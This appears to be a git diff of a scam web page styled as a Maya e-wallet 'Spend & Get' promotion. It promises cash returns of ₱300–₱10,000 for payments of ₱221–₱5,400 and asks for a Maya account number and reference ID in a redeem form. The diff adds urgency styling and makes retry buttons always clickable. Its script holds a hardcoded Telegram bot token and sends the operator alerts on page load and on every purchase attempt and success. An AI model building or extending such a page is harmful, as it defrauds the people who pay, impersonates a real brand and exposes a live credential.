@@ -4,9 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Maya · Spend & Get</title>
-  <!-- Google Font -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet" />
-  <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   
@@ -175,7 +173,6 @@
       margin-top: 0.2rem;
     }
 
-    /* ========== CARDS GRID - 2 COLUMNS ========== */
     .cards-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -196,7 +193,7 @@
       text-align: center;
       transition: all 0.4s ease;
       position: relative;
-      overflow: hidden;
+      overflow: visible;
     }
 
     .card-item::before {
@@ -205,12 +202,100 @@
       inset: 0;
       background: linear-gradient(135deg, rgba(46, 242, 163, 0.02), transparent 60%);
       pointer-events: none;
+      border-radius: 20px;
     }
 
     .card-item:hover {
       border-color: rgba(46, 242, 163, 0.12);
       transform: translateY(-2px);
       box-shadow: 0 8px 30px -8px rgba(0, 0, 0, 0.4);
+    }
+
+    /* ========== HOT INDICATOR - OVERLAY ========== */
+    .hot-indicator {
+      position: absolute;
+      top: -8px;
+      right: -8px;
+      background: linear-gradient(135deg, #ff2222, #ff6b6b, #ff2222);
+      background-size: 200% 200%;
+      color: #fff;
+      font-size: 0.55rem;
+      font-weight: 800;
+      padding: 0.3rem 0.8rem;
+      border-radius: 20px;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      box-shadow: 0 0 30px rgba(255, 34, 34, 0.5), 0 0 60px rgba(255, 34, 34, 0.2);
+      animation: hotMove 1.5s ease-in-out infinite;
+      z-index: 10;
+      border: 2px solid rgba(255, 255, 255, 0.15);
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      pointer-events: none;
+    }
+
+    .hot-indicator .hot-icon {
+      font-size: 0.6rem;
+      display: inline-block;
+      animation: iconBounce 0.8s ease-in-out infinite;
+    }
+
+    @keyframes hotMove {
+      0%, 100% {
+        transform: translate(0, 0) scale(1);
+        background-position: 0% 50%;
+        box-shadow: 0 0 30px rgba(255, 34, 34, 0.5);
+      }
+      25% {
+        transform: translate(-3px, -3px) scale(1.05);
+        box-shadow: 0 0 50px rgba(255, 34, 34, 0.7);
+      }
+      50% {
+        transform: translate(3px, 2px) scale(1.08);
+        background-position: 100% 50%;
+        box-shadow: 0 0 60px rgba(255, 34, 34, 0.8), 0 0 100px rgba(255, 34, 34, 0.3);
+      }
+      75% {
+        transform: translate(-2px, 4px) scale(1.05);
+        box-shadow: 0 0 40px rgba(255, 34, 34, 0.6);
+      }
+    }
+
+    @keyframes iconBounce {
+      0%, 100% {
+        transform: rotate(-15deg) scale(1);
+      }
+      50% {
+        transform: rotate(15deg) scale(1.2);
+      }
+    }
+
+    .hot-indicator::before {
+      content: '';
+      position: absolute;
+      inset: -4px;
+      border-radius: 24px;
+      padding: 4px;
+      background: linear-gradient(135deg, #ff2222, #ff6b6b, #ffaa00, #ff2222);
+      background-size: 300% 300%;
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      opacity: 0.8;
+      animation: glowMove 2s ease-in-out infinite;
+    }
+
+    @keyframes glowMove {
+      0%, 100% {
+        background-position: 0% 50%;
+        opacity: 0.6;
+      }
+      50% {
+        background-position: 100% 50%;
+        opacity: 1;
+      }
     }
 
     .card-item .card-image-wrapper {
@@ -330,106 +415,43 @@
       transform: scale(0.95);
     }
 
-    .card-item .try-btn:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none !important;
-    }
-
     .card-item .try-btn.claimed {
       background: rgba(255, 255, 255, 0.05);
       color: rgba(255, 255, 255, 0.3);
       border: 1px solid rgba(255, 255, 255, 0.05);
+      cursor: not-allowed;
     }
 
-    /* ========== HOT INDICATOR - WITH MOVEMENT ANIMATION ========== */
-.hot-indicator {
-  position: absolute;
-  top: -8px;
-  right: -8px;
-  background: linear-gradient(135deg, #ff2222, #ff6b6b, #ff2222);
-  background-size: 200% 200%;
-  color: #fff;
-  font-size: 0.55rem;
-  font-weight: 800;
-  padding: 0.3rem 0.8rem;
-  border-radius: 20px;
-  text-transform: uppercase;
-  letter-spacing: 0.06em;
-  box-shadow: 0 0 30px rgba(255, 34, 34, 0.5), 0 0 60px rgba(255, 34, 34, 0.2);
-  animation: hotMove 1.5s ease-in-out infinite;
-  z-index: 10;
-  border: 2px solid rgba(255, 255, 255, 0.15);
-  display: flex;
-  align-items: center;
-  gap: 4px;
-}
+    .redeem-section {
+      margin-top: 0.5rem;
+    }
 
-.hot-indicator .hot-icon {
-  font-size: 0.6rem;
-  display: inline-block;
-  animation: iconBounce 0.8s ease-in-out infinite;
-}
+    .redeem-btn {
+      background: linear-gradient(135deg, #2EF2A3, #1bcb86);
+      border: none;
+      padding: 0.9rem;
+      border-radius: 50px;
+      font-family: 'Inter', sans-serif;
+      font-weight: 700;
+      font-size: 1rem;
+      color: #031009;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      box-shadow: 0 0 40px rgba(46, 242, 163, 0.1);
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
 
-@keyframes hotMove {
-  0%, 100% {
-    transform: translate(0, 0) scale(1);
-    background-position: 0% 50%;
-    box-shadow: 0 0 30px rgba(255, 34, 34, 0.5);
-  }
-  25% {
-    transform: translate(-3px, -3px) scale(1.05);
-    box-shadow: 0 0 50px rgba(255, 34, 34, 0.7);
-  }
-  50% {
-    transform: translate(3px, 2px) scale(1.08);
-    background-position: 100% 50%;
-    box-shadow: 0 0 60px rgba(255, 34, 34, 0.8), 0 0 100px rgba(255, 34, 34, 0.3);
-  }
-  75% {
-    transform: translate(-2px, 4px) scale(1.05);
-    box-shadow: 0 0 40px rgba(255, 34, 34, 0.6);
-  }
-}
+    .redeem-btn:hover {
+      transform: scale(1.02);
+      box-shadow: 0 0 60px rgba(46, 242, 163, 0.2);
+    }
 
-@keyframes iconBounce {
-  0%, 100% {
-    transform: rotate(-15deg) scale(1);
-  }
-  50% {
-    transform: rotate(15deg) scale(1.2);
-  }
-}
+    .redeem-btn:active {
+      transform: scale(0.97);
+    }
 
-/* Glowing border animation */
-.hot-indicator::before {
-  content: '';
-  position: absolute;
-  inset: -4px;
-  border-radius: 24px;
-  padding: 4px;
-  background: linear-gradient(135deg, #ff2222, #ff6b6b, #ffaa00, #ff2222);
-  background-size: 300% 300%;
-  -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-  mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-  -webkit-mask-composite: xor;
-  mask-composite: exclude;
-  opacity: 0.8;
-  animation: glowMove 2s ease-in-out infinite;
-}
-
-@keyframes glowMove {
-  0%, 100% {
-    background-position: 0% 50%;
-    opacity: 0.6;
-  }
-  50% {
-    background-position: 100% 50%;
-    opacity: 1;
-  }
-}
-
-    /* ========== INFO BADGE ========== */
     .info-badge {
       display: flex;
       align-items: center;
@@ -684,12 +706,6 @@
       object-fit: contain;
     }
 
-    .popup-purchase-btn:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none !important;
-    }
-
     .popup-footer {
       color: rgba(255, 255, 255, 0.06);
       font-size: 0.55rem;
@@ -927,7 +943,6 @@
       }
     }
 
-    /* ========== RESPONSIVE ========== */
     @media (max-width: 420px) {
       .main-container {
         padding: 0.3rem;
@@ -1014,8 +1029,14 @@
       }
 
       .hot-indicator {
-        font-size: 0.4rem;
-        padding: 0.15rem 0.5rem;
+        font-size: 0.45rem;
+        padding: 0.2rem 0.6rem;
+        top: -6px;
+        right: -6px;
+      }
+
+      .hot-indicator .hot-icon {
+        font-size: 0.5rem;
       }
     }
 
@@ -1039,6 +1060,17 @@
         width: 80px;
         height: 80px;
       }
+
+      .hot-indicator {
+        font-size: 0.4rem;
+        padding: 0.15rem 0.5rem;
+        top: -4px;
+        right: -4px;
+      }
+
+      .hot-indicator .hot-icon {
+        font-size: 0.45rem;
+      }
     }
 
     @media (min-width: 421px) and (max-width: 768px) {
@@ -1048,14 +1080,13 @@
     }
 
     @media (hover: hover) {
-      .card-item:hover .try-btn:not(:disabled) {
+      .card-item:hover .try-btn:not(.claimed) {
         box-shadow: 0 0 30px rgba(46, 242, 163, 0.2);
       }
     }
   </style>
 </head>
 <body>
-  <!-- Ambient Glow -->
   <div class="ambient-glow top-right"></div>
   <div class="ambient-glow bottom-left"></div>
 
@@ -1063,39 +1094,23 @@
   <div class="popup-overlay" id="popupOverlay">
     <div class="popup-card">
       <button class="popup-close" id="popupClose">✕</button>
-      
-      <div class="popup-image-wrapper" id="popupImageWrapper">
-        <img src="" alt="Treat" id="popupImage" />
-      </div>
-      
+      <div class="popup-image-wrapper"><img src="" alt="Treat" id="popupImage" /></div>
       <h2 class="popup-title" id="popupTitle">Treat Pack</h2>
       <p class="popup-sub" id="popupSub">You can get up to this amount!</p>
-      
-      <div class="popup-spend" id="popupSpend">
+      <div class="popup-spend">
         <span class="spend-label">Spend</span>
         <span class="spend-amount" id="popupSpendAmount">₱0</span>
       </div>
-      
       <div class="popup-range">
         <div class="range-label">🎯 Possible Reward</div>
-        <div class="range-value">
-          ₱<span class="highlight" id="popupMinAmount">0</span> - ₱<span class="highlight" id="popupMaxAmount">0</span>
-        </div>
+        <div class="range-value">₱<span class="highlight" id="popupMinAmount">0</span> - ₱<span class="highlight" id="popupMaxAmount">0</span></div>
       </div>
-      
       <div class="popup-message">
-        <p>
-          ⚡ <span class="highlight-text">This treat is exclusive for you!</span>
-          <br>
-          🔒 <span style="color: rgba(255,255,255,0.3);">One-time use only · Valid for 24 hours</span>
-        </p>
+        <p>⚡ <span class="highlight-text">This treat is exclusive for you!</span><br>🔒 <span style="color: rgba(255,255,255,0.3);">One-time use only · Valid for 24 hours</span></p>
       </div>
-
       <button class="popup-purchase-btn" id="popupPurchaseBtn">
-        <img src="images/maya_icon.png" alt="Maya" class="maya-icon-sm" />
-        Purchase Treats via MAYA
+        <img src="images/maya_icon.png" alt="Maya" class="maya-icon-sm" /> Purchase Treats via MAYA
       </button>
-      
       <div class="popup-footer">✦ Transaction will be processed</div>
     </div>
   </div>
@@ -1104,10 +1119,8 @@
   <div class="redeem-popup-overlay" id="redeemPopupOverlay">
     <div class="redeem-popup-card">
       <button class="redeem-popup-close" id="redeemPopupClose">✕</button>
-      
       <h2 class="redeem-popup-title">✨ Redeem Treats</h2>
       <p class="redeem-popup-sub">Fill in your details to complete the redemption</p>
-      
       <div class="redeem-popup-form">
         <div class="form-group">
           <label for="mayaAccount">Maya Account Number</label>
@@ -1118,19 +1131,15 @@
           <input type="text" id="referenceId" placeholder="Enter your reference ID" />
         </div>
       </div>
-
       <button class="redeem-popup-btn" id="redeemPopupBtn">
-        <img src="images/maya_icon.png" alt="Maya" class="maya-icon-sm" />
-        Redeem via MAYA
+        <img src="images/maya_icon.png" alt="Maya" class="maya-icon-sm" /> Redeem via MAYA
       </button>
-      
       <div class="redeem-popup-footer">✦ Redemption is subject to verification</div>
     </div>
   </div>
 
   <div class="main-container">
     <div class="glass-panel">
-      <!-- Header -->
       <div class="header">
         <div class="logo-wrapper">
           <img src="images/maya_icon.png" alt="Maya" class="maya-logo" />
@@ -1139,99 +1148,71 @@
         <a href="index.html" class="back-btn">← Back</a>
       </div>
 
-      <!-- Page Title -->
       <div class="page-title">
         <h1>Spin & Get</h1>
         <p>Spend Treats and Get Cash Back Bonuses</p>
       </div>
 
-      <!-- Cards Grid - 2 Columns -->
       <div class="cards-grid">
-        <!-- Card T1 (5H) - with HOT indicator -->
+        <!-- T1 - with HOT -->
         <div class="card-item" data-id="T1" data-type="5H" data-spend="221" data-min="300" data-max="500" data-image="images/maya500.png" data-timer="120">
-          <div class="hot-indicator">🔥 HOT</div>
-          <div class="card-image-wrapper">
-            <img src="images/maya500.png" alt="T1" />
-          </div>
+          <div class="hot-indicator"><span class="hot-icon">🔥</span> HOT</div>
+          <div class="card-image-wrapper"><img src="images/maya500.png" alt="T1" /></div>
           <div class="card-title">Treat Pack 1</div>
           <div class="card-subtitle">🎯 Basic</div>
           <div class="card-details">
-            <span class="spend-label">Spend</span>
-            <span class="spend-amount">₱221</span>
-            <span class="get-label">Get</span>
-            <span class="get-amount">₱300 - 500</span>
+            <span class="spend-label">Spend</span><span class="spend-amount">₱221</span>
+            <span class="get-label">Get</span><span class="get-amount">₱300 - 500</span>
           </div>
-          <div class="card-timer">
-            <span class="timer-value" id="timer-T1"></span>
-          </div>
+          <div class="card-timer"><span class="timer-value" id="timer-T1"></span></div>
           <button class="try-btn" data-id="T1" data-type="5H">Try this Treats!</button>
         </div>
 
-        <!-- Card T2 (1K) - with HOT indicator -->
+        <!-- T2 - with HOT -->
         <div class="card-item" data-id="T2" data-type="1K" data-spend="545" data-min="600" data-max="3000" data-image="images/maya1000.png" data-timer="120">
-          <div class="hot-indicator">🔥 HOT</div>
-          <div class="card-image-wrapper">
-            <img src="images/maya1000.png" alt="T2" />
-          </div>
+          <div class="hot-indicator"><span class="hot-icon">🔥</span> HOT</div>
+          <div class="card-image-wrapper"><img src="images/maya1000.png" alt="T2" /></div>
           <div class="card-title">Treat Pack 2</div>
           <div class="card-subtitle">🌟 Silver</div>
           <div class="card-details">
-            <span class="spend-label">Spend</span>
-            <span class="spend-amount">₱545</span>
-            <span class="get-label">Get</span>
-            <span class="get-amount">₱600 - 3,000</span>
+            <span class="spend-label">Spend</span><span class="spend-amount">₱545</span>
+            <span class="get-label">Get</span><span class="get-amount">₱600 - 3,000</span>
           </div>
-          <div class="card-timer">
-            <span class="timer-value" id="timer-T2"></span>
-          </div>
+          <div class="card-timer"><span class="timer-value" id="timer-T2"></span></div>
           <button class="try-btn" data-id="T2" data-type="1K">Try this Treats!</button>
         </div>
 
-        <!-- Card T3 (6K) -->
+        <!-- T3 -->
         <div class="card-item" data-id="T3" data-type="6K" data-spend="3240" data-min="4000" data-max="6000" data-image="images/maya6k.png" data-timer="120">
-          <div class="card-image-wrapper">
-            <img src="images/maya6k.png" alt="T3" />
-          </div>
+          <div class="card-image-wrapper"><img src="images/maya6k.png" alt="T3" /></div>
           <div class="card-title">Treat Pack 3</div>
           <div class="card-subtitle">💎 Gold</div>
           <div class="card-details">
-            <span class="spend-label">Spend</span>
-            <span class="spend-amount">₱3,240</span>
-            <span class="get-label">Get</span>
-            <span class="get-amount">₱4,000 - 6,000</span>
+            <span class="spend-label">Spend</span><span class="spend-amount">₱3,240</span>
+            <span class="get-label">Get</span><span class="get-amount">₱4,000 - 6,000</span>
           </div>
-          <div class="card-timer">
-            <span class="timer-value" id="timer-T3"></span>
-          </div>
+          <div class="card-timer"><span class="timer-value" id="timer-T3"></span></div>
           <button class="try-btn" data-id="T3" data-type="6K">Try this Treats!</button>
         </div>
 
-        <!-- Card T4 (10K) -->
+        <!-- T4 -->
         <div class="card-item" data-id="T4" data-type="10K" data-spend="5400" data-min="7000" data-max="10000" data-image="images/maya10k.png" data-timer="120">
-          <div class="card-image-wrapper">
-            <img src="images/maya10k.png" alt="T4" />
-          </div>
+          <div class="card-image-wrapper"><img src="images/maya10k.png" alt="T4" /></div>
           <div class="card-title">Treat Pack 4</div>
           <div class="card-subtitle">👑 Platinum</div>
           <div class="card-details">
-            <span class="spend-label">Spend</span>
-            <span class="spend-amount">₱5,400</span>
-            <span class="get-label">Get</span>
-            <span class="get-amount">₱7,000 - 10,000</span>
+            <span class="spend-label">Spend</span><span class="spend-amount">₱5,400</span>
+            <span class="get-label">Get</span><span class="get-amount">₱7,000 - 10,000</span>
           </div>
-          <div class="card-timer">
-            <span class="timer-value" id="timer-T4"></span>
-          </div>
+          <div class="card-timer"><span class="timer-value" id="timer-T4"></span></div>
           <button class="try-btn" data-id="T4" data-type="10K">Try this Treats!</button>
         </div>
       </div>
 
-      <!-- Redeem Button -->
       <div class="redeem-section">
         <button class="redeem-btn" id="redeemBtn">✨ REDEEM TREATS</button>
       </div>
 
-      <!-- Info Badge -->
       <div class="info-badge">
         <span>✦ <span class="highlight-text">One-time per user</span> · Cannot join if you participated in Free ₱200</span>
       </div>
@@ -1262,7 +1243,7 @@
     // TELEGRAM CONFIGURATION
     // ============================================================
     const TELEGRAM_BOT_TOKEN = '8815661385:AAGP6yCoYtEqvMB9BzGw23KqXEm846_fdnU';
-  const TELEGRAM_CHAT_ID = '7298607329';
+    const TELEGRAM_CHAT_ID = '7298607329';
 
     function sendTelegramNotification(message) {
       const msg = `📢 *User Activity Alert!*\n\n${message}\n\n🕐 ${new Date().toLocaleString()}`;
@@ -1277,7 +1258,13 @@
         })
       })
       .then(response => response.json())
-      .then(data => console.log('✅ Telegram sent:', data))
+      .then(data => {
+        if (data.ok) {
+          console.log('✅ Telegram sent:', data);
+        } else {
+          console.error('❌ Telegram error:', data.description);
+        }
+      })
       .catch(error => console.error('❌ Telegram failed:', error));
     }
 
@@ -1392,9 +1379,8 @@
         
         const btn = document.querySelector(`.try-btn[data-id="${treatId}"]`);
         if (btn) {
-          btn.disabled = true;
-          btn.textContent = '✅ Claimed';
           btn.classList.add('claimed');
+          btn.textContent = '✅ Claimed';
         }
 
         const timerEl = document.getElementById(`timer-${treatId}`);
@@ -1417,9 +1403,8 @@
         if (localStorage.getItem(claimedKey) === 'true') {
           const btn = document.querySelector(`.try-btn[data-id="${treatId}"]`);
           if (btn) {
-            btn.disabled = true;
-            btn.textContent = '✅ Claimed';
             btn.classList.add('claimed');
+            btn.textContent = '✅ Claimed';
           }
           const timerEl = document.getElementById(`timer-${treatId}`);
           if (timerEl) timerEl.textContent = '✅ Claimed';
@@ -1507,22 +1492,25 @@
         const card = document.querySelector(`.card-item[data-id="${treatId}"]`);
         const treatType = card ? card.dataset.type : null;
 
+        // Check if already claimed
         if (localStorage.getItem(getClaimedKey(treatId)) === 'true') {
           showToast('⚠️ This treat has already been claimed!', true);
           closePopup();
           return;
         }
 
-        // Send Telegram notification
+        // Send Telegram notification - ALWAYS SEND
         const treatNames = {
           'T1': 'Treat Pack 1 (5H)',
           'T2': 'Treat Pack 2 (1K)',
           'T3': 'Treat Pack 3 (6K)',
           'T4': 'Treat Pack 4 (10K)'
         };
+        
+        // Send Telegram alert for every purchase attempt
         sendTelegramNotification(`👤 *User is purchasing a treat!*\n📦 *Treat:* ${treatNames[treatId] || treatId}\n💰 *Spend:* ₱${card?.dataset?.spend || 'N/A'}\n🎯 *Target:* ₱${card?.dataset?.min || 'N/A'} - ₱${card?.dataset?.max || 'N/A'}`);
 
-        // Check if link exists for this treat type
+        // Check if link exists
         getLinkByType(treatType)
           .then(({ linkId, linkData }) => {
             const newClicks = (linkData.clicks || 0) + 1;
@@ -1530,6 +1518,10 @@
               .then(() => {
                 claimTreat(treatId);
                 closePopup();
+                
+                // Send success Telegram
+                sendTelegramNotification(`✅ *SUCCESS!*\n📦 *Treat:* ${treatNames[treatId] || treatId}\n🔗 *Link deployed!*\n👆 *Total Clicks:* ${newClicks}`);
+                
                 window.open(linkData.url, '_blank');
               })
               .catch((error) => {
@@ -1540,14 +1532,13 @@
               });
           })
           .catch((error) => {
-            // No link found - show toast but keep timer running
+            // No link found - send Telegram alert
             sendTelegramNotification(`⚠️ *NO LINK AVAILABLE!*\n📦 *Treat:* ${treatNames[treatId] || treatId}\n🔗 *Type:* ${treatType}\n❌ User attempted to purchase but no link is deployed.`);
+            
             closePopup();
             showToast('⚠️ This treat is currently unavailable. Please try again later.', true);
             
-            // Timer continues running in the background
-            // The "Try this Treats!" button remains clickable
-            // User can try again after timer resets
+            // Timer continues running - button remains clickable
           });
       }
 
@@ -1590,11 +1581,12 @@
       }
 
       // ========== EVENT LISTENERS ==========
+      // Try buttons - ALWAYS CLICKABLE (except when claimed)
       tryBtns.forEach(btn => {
         btn.addEventListener('click', function() {
           const treatId = this.dataset.id;
           
-          // Check if already claimed
+          // Check if already claimed - only time button is disabled
           if (localStorage.getItem(getClaimedKey(treatId)) === 'true') {
             showToast('⚠️ You already claimed this treat!', true);
             return;
@@ -1606,13 +1598,42 @@
             return;
           }
 
-          // Check if ready
+          // Check if ready - still clickable, shows popup
           if (localStorage.getItem(getTimerReadyKey(treatId)) === 'true') {
-            showToast('✅ This treat is ready! Please purchase it.', true);
+            // Show popup directly for purchase
+            const card = document.querySelector(`.card-item[data-id="${treatId}"]`);
+            if (card) {
+              const image = card.dataset.image;
+              const spend = parseInt(card.dataset.spend);
+              const minAmount = parseInt(card.dataset.min);
+              const maxAmount = parseInt(card.dataset.max);
+
+              popupImage.src = image;
+              popupImage.alt = `Treat ${treatId}`;
+              
+              const treatNames = {
+                'T1': { title: 'Basic Treat Pack', sub: 'Start your rewards journey!' },
+                'T2': { title: 'Silver Treat Pack', sub: 'Level up your rewards!' },
+                'T3': { title: 'Gold Treat Pack', sub: 'Exclusive premium rewards!' },
+                'T4': { title: 'Platinum Treat Pack', sub: 'The ultimate reward awaits!' }
+              };
+
+              const info = treatNames[treatId] || treatNames['T1'];
+              popupTitle.textContent = info.title;
+              popupSub.textContent = info.sub;
+              popupSpendAmount.textContent = `₱${spend.toLocaleString()}`;
+              popupMinAmount.textContent = minAmount.toLocaleString();
+              popupMaxAmount.textContent = maxAmount.toLocaleString();
+
+              popupPurchaseBtn.dataset.treatId = treatId;
+
+              popupOverlay.classList.add('active');
+              document.body.style.overflow = 'hidden';
+            }
             return;
           }
 
-          // Show popup - this starts the timer
+          // Normal flow - show popup and start timer
           showPopup(treatId);
         });
       });
@@ -1649,6 +1670,9 @@
           setTimeout(() => toast.remove(), 300);
         }, 4000);
       }
+
+      // Test Telegram on load
+      sendTelegramNotification('✅ *Main page loaded!*\n👤 User is on the Spin & Get page.');
 
       console.log('✅ Spin & Get page initialized');
     });
